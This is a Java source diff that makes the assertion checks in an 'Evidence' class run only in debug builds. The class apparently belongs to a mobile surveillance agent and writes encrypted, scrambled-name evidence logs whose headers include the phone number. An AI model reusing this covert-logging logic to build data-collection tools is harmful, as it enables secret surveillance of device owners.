@@ -138,14 +138,14 @@ public final class Evidence {
 	 */
 	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
 		this();
-		Check.requires(aesKey != null, "aesKey null");
+		if(Cfg.DEBUG) Check.requires(aesKey != null, "aesKey null");
 		// agent = agent_;
 		this.typeEvidenceId = typeEvidenceId;
 		this.aesKey = aesKey;
 
 		encryption = new Encryption(aesKey);
-		// Check.ensures(agent != null, "createLog: agent null");
-		Check.ensures(encryption != null, "encryption null");
+		// if(Cfg.DEBUG) Check.ensures(agent != null, "createLog: agent null");
+		if(Cfg.DEBUG) Check.ensures(encryption != null, "encryption null");
 	}
 
 	/**
@@ -233,7 +233,7 @@ public final class Evidence {
 			final EvidenceType evidenceType) {
 
 		this.typeEvidenceId = evidenceType;
-		Check.requires(fconn == null, "createLog: not previously closed");
+		if(Cfg.DEBUG) Check.requires(fconn == null, "createLog: not previously closed");
 		timestamp = new Date();
 
 		int additionalLen = 0;
@@ -262,10 +262,10 @@ public final class Evidence {
 		}
 
 		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
-		Check.asserts(fileName != null, "null fileName");
-		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
+		if(Cfg.DEBUG) Check.asserts(fileName != null, "null fileName");
+		if(Cfg.DEBUG) Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
 				"file not scrambled");
-		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
+		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
 		try {
 			fconn = new AutoFile(fileName);
 
@@ -278,17 +278,17 @@ public final class Evidence {
 					+ name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
-			Check.asserts(plainBuffer.length >= 32 + additionalLen,
+			if(Cfg.DEBUG) Check.asserts(plainBuffer.length >= 32 + additionalLen,
 					"Short plainBuffer");
 
 			final byte[] encBuffer = encryption.encryptData(plainBuffer);
-			Check.asserts(encBuffer.length == encryption
+			if(Cfg.DEBUG) Check.asserts(encBuffer.length == encryption
 					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
 			// scriviamo la dimensione dell'header paddato
 			fconn.write(Utils.intToByteArray(plainBuffer.length));
 			// scrittura dell'header cifrato
 			fconn.append(encBuffer);
-			Check.asserts(fconn.getSize() == encBuffer.length + 4,
+			if(Cfg.DEBUG) Check.asserts(fconn.getSize() == encBuffer.length + 4,
 					"Wrong filesize");
 			// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " additionalData.length: " +
 			// plainBuffer.length);
@@ -338,7 +338,7 @@ public final class Evidence {
 				.getPhoneNumber()).length;
 
 		final byte[] baseHeader = evidenceDescription.getBytes();
-		Check.asserts(baseHeader.length == evidenceDescription.length,
+		if(Cfg.DEBUG) Check.asserts(baseHeader.length == evidenceDescription.length,
 				"Wrong log len");
 		final int headerLen = baseHeader.length
 				+ evidenceDescription.additionalData
@@ -478,7 +478,7 @@ public final class Evidence {
 			final EvidenceType logType, final byte[] content) {
 		if (createEvidence(additionalData, logType)) {
 			writeEvidence(content);
-			Check.ensures(getEncData().length % 16 == 0, "wrong len");
+			if(Cfg.DEBUG) Check.ensures(getEncData().length % 16 == 0, "wrong len");
 			close();
 		}
 	}
